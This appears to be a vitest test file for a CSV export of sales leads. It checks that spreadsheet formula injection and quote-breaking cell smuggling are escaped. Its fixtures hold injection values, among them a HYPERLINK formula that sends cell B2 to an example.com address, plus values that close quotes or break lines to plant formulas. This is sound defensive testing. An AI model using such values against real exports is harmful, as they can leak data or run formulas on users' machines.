/**
 * The CSV of the leads chosen in the list (#996), which the browser writes: each cell goes
 * through csvCell as in the server's export, so that a value from a public form neither runs as a
 * formula in a spreadsheet nor closes its quotes to make cells of its own. Read back as a
 * spreadsheet splits it (RFC 4180), the file keeps its columns and every value as it was sent.
 */
import { type SelectedLeadCsvRow, selectedLeadsCsv } from '@/lib/features/leads/export';
import { describe, expect, it } from 'vitest';

const HEADERS = ['Name', 'Email', 'Company', 'Phone', 'Status', 'Score', 'Source', 'Created At'];

/** Reads a CSV back into rows of cells, as a spreadsheet splits it (RFC 4180; any line break) */
function readCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const char = text[i];
    if (quoted) {
      if (char === '"' && text[i + 1] === '"') {
        cell += '"';
        i++;
      } else if (char === '"') quoted = false;
      else cell += char;
    } else if (char === '"' && cell === '') quoted = true;
    else if (char === ',') {
      row.push(cell);
      cell = '';
    } else if (char === '\n' || char === '\r') {
      // A line break outside quotes ends the record: LF, CR LF or CR
      if (char === '\r' && text[i + 1] === '\n') i++;
      row.push(cell);
      rows.push(row);
      row = [];
      cell = '';
    } else cell += char;
  }
  row.push(cell);
  rows.push(row);
  return rows;
}

const lead = (overrides: Partial<SelectedLeadCsvRow> = {}): SelectedLeadCsvRow => ({
  name: '架空 太郎',
  email: 'taro@example.jp',
  company: '架空商事',
  phone: '03-0000-0000',
  status: 'new',
  score: 70,
  source: 'diagnostic',
  createdAt: new Date('2026-11-10T01:02:03.000Z'),
  ...overrides,
});

describe('selectedLeadsCsv', () => {
  it('writes the columns it always had, a row per lead', () => {
    const rows = readCsv(selectedLeadsCsv([lead(), lead({ name: '架空 花子' })]));

    expect(rows).toEqual([
      HEADERS,
      ['架空 太郎', 'taro@example.jp', '架空商事', '03-0000-0000', 'new', '70', 'diagnostic', '2026-11-10T01:02:03.000Z'],
      ['架空 花子', 'taro@example.jp', '架空商事', '03-0000-0000', 'new', '70', 'diagnostic', '2026-11-10T01:02:03.000Z'],
    ]);
  });

  it('keeps a formula from running: a leading = + - @, tab or CR gets a quote mark first', () => {
    const company = '=HYPERLINK("https://example.com/?d="&B2,"詳細")';
    const [, row] = readCsv(
      selectedLeadsCsv([
        lead({
          name: '+1+1',
          email: '-1+1@example.jp',
          company,
          phone: '@SUM(1+1)',
          status: '\r=1+1',
          source: '\t=1+1',
        }),
      ])
    );

    expect(row).toHaveLength(HEADERS.length);
    expect(row.slice(0, 5)).toEqual([
      `'+1+1`,
      `'-1+1@example.jp`,
      `'${company}`,
      `'@SUM(1+1)`,
      `'\r=1+1`,
    ]);
    expect(row[6]).toBe(`'\t=1+1`);
  });

  it('puts every text column through it, the status too', () => {
    const [, row] = readCsv(
      selectedLeadsCsv([
        lead({
          name: '=1+1',
          email: '=1+1',
          company: '=1+1',
          phone: '=1+1',
          status: '=1+1',
          source: '=1+1',
        }),
      ])
    );

    expect([row[0], row[1], row[2], row[3], row[4], row[6]]).toEqual(Array(6).fill(`'=1+1`));
  });

  it('keeps a value that closes its quotes in its own cell, as it was sent', () => {
    // Before #996 the cell was only put in quotes: this one made cells of its own, a formula first
    const name = '架空 太郎","=1+1';
    const company = '架空商事"\n=1+1';
    const rows = readCsv(selectedLeadsCsv([lead({ name, company })]));

    expect(rows).toHaveLength(2);
    expect(rows[1]).toHaveLength(HEADERS.length);
    expect(rows[1][0]).toBe(name);
    expect(rows[1][2]).toBe(company);
    expect(rows.flat().some((cell) => /^[=+\-@]/.test(cell))).toBe(false);
  });

  it('keeps a value that only breaks its line in its own cell, a line of its own never made', () => {
    // No quote nor comma in them: the line break alone has them quoted (an import may carry one)
    const company = '架空商事\n=1+1';
    const phone = '03-0000-0000\r\n=1+1';
    const source = 'diagnostic\r=1+1';
    const rows = readCsv(selectedLeadsCsv([lead({ company, phone, source })]));

    expect(rows).toHaveLength(2);
    expect(rows[1]).toHaveLength(HEADERS.length);
    expect([rows[1][2], rows[1][3], rows[1][6]]).toEqual([company, phone, source]);
  });

  it('leaves the cells of what the lead has not empty, and writes a day sent as text', () => {
    const [, empty, zero] = readCsv(
      selectedLeadsCsv([
        lead({ name: null, company: null, phone: null, score: null, source: null, createdAt: null }),
        lead({ score: 0, createdAt: '2026-11-10T01:02:03.000Z' }),
      ])
    );

    expect(empty).toEqual(['', 'taro@example.jp', '', '', 'new', '', '', '']);
    expect(zero[5]).toBe('0');
    expect(zero[7]).toBe('2026-11-10T01:02:03.000Z');
  });
});
